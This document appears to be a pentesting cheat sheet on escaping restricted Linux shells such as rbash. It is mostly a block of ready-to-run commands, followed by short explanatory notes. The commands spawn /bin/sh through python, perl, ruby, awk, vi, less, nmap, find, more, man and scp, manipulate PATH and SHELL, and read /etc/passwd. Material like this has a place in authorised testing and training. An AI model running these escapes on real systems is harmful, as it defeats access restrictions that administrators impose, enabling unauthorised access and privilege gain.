```sh
Restricted Shell Escape Attempts

```bash
# 1. Check the restricted shell type (if possible)
# (Often, this is not directly visible)

# 2. Enumerate allowed commands (try common ones)
ls
pwd
whoami
id
echo $PATH
env
# Try other basic commands

# 3. Test command substitution
ls -l `pwd`
ls -l $(pwd)
echo `whoami`
echo $(whoami)

# 4. Test command chaining
ls; whoami
pwd && id
echo 1 || echo 2
cat /etc/passwd | grep root

# 5. Test environment variable manipulation (if possible)
echo $PATH
export PATH=/bin:/usr/bin:/sbin:/usr/sbin
echo $PATH
echo $SHELL
export SHELL=/bin/bash
$SHELL # Try to spawn a new shell

# 6. Test shell function creation (if possible)
function test { /bin/bash; }
test

# 7. Try common escape binaries (if available)
sh
bash
python -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
awk 'BEGIN {system("/bin/sh")}'
vi
nano
tmux
screen
less /etc/passwd # Then !/bin/sh
nmap --interactive # Then !sh
find / -exec /bin/sh \; 

# 8. If vi is available
vi
# Then:
# :!/bin/sh
# or
# :set shell=/bin/bash
# :shell

# 9. GTFObins Check (Manual - Check allowed binaries against GTFObins)
# Example: If 'more' is allowed, check GTFObins for 'more'
# Example: If 'scp' is allowed, check GTFObins for 'scp'
# Example: If 'man' is allowed, check GTFObins for 'man'

# Example: If 'more' is allowed, and GTFObins shows an escape:
more /etc/passwd
:!/bin/sh

# Example: If 'man' is allowed, and GTFObins shows an escape:
man man
:!/bin/sh

# Example: If 'scp' is allowed, and GTFObins shows an escape:
scp user@host:/dev/null /dev/null -S /bin/sh

### **Understanding Restricted Shells**

- **Purpose:**
    - Limit user capabilities for security.
    - Prevent accidental or intentional system damage.
    - Control access to specific system features.
- **Common Types:**
    - `rbash` (Restricted Bourne shell)
    - `rksh` (Restricted Korn shell)
    - `rzsh` (Restricted Z shell)
- **Restrictions:**
    - Limited command execution.
    - Restricted directory access.
    - Disabled environment variable modification.
    - Prevented shell function creation.

**Escaping Techniques**

The document outlines several methods, which can be summarized and expanded upon:

- **Command Injection:**
    - Exploiting vulnerabilities where user input is directly used in command execution.
    - Example: `ls -l \`pwd`` (using backticks for command substitution).
    - This is very dependent on the specific implementation of the restricted shell.
- **Command Substitution:**
    - Using backticks (`) or `$(command)` to execute commands within other commands.
    - If the restricted shell allows any form of command substitution, it can often be abused.
- **Command Chaining:**
    - Using `;`, `&&`, `||`, or `|` to execute multiple commands in sequence.
    - If the shell allows any of these, it may be possible to chain an allowed command with an escape command.
- **Environment Variables:**
    - Manipulating variables like `PATH` or `SHELL` to execute unauthorized commands.
    - If the shell allows any modification of environment variables, this is a very common method of escape.
- **Shell Functions:**
    - Defining custom functions to bypass restrictions.
    - If function definitions are possible, this is a very powerful way to escape.

**Practical Considerations**

- **Specific Restrictions:** The effectiveness of these techniques depends entirely on the specific restrictions imposed by the restricted shell.
- **Enumeration:** Thoroughly enumerate the shell's limitations. What commands are allowed? What environment variables exist?
- **Binary Exploitation:** If standard escape methods fail, consider if any allowed binaries have known vulnerabilities.
- **GTFObins:** GTFObins is an excellent resource for finding ways to abuse common Linux binaries. Many of these techniques can be used to escape restricted shells.
- **Common Escape Commands:**
    - `sh`, `bash`, `python`, `perl`, `ruby`, `awk`, `vi`, `nano`, `tmux`, `screen` and many more. If any of these are available, they are very often used to escape.

**Example scenarios and commands**

- **If vi is available:** `:!/bin/sh`
- **If Python is available:** `python -c 'import os; os.system("/bin/sh")'`
- **If Perl is available:** `perl -e 'exec "/bin/sh";'`
- **If less is available:** `!/bin/sh`
- **If nmap is available:** `!sh` inside of an interactive nmap session.
- **If find is available:** `find / -exec /bin/sh \;`
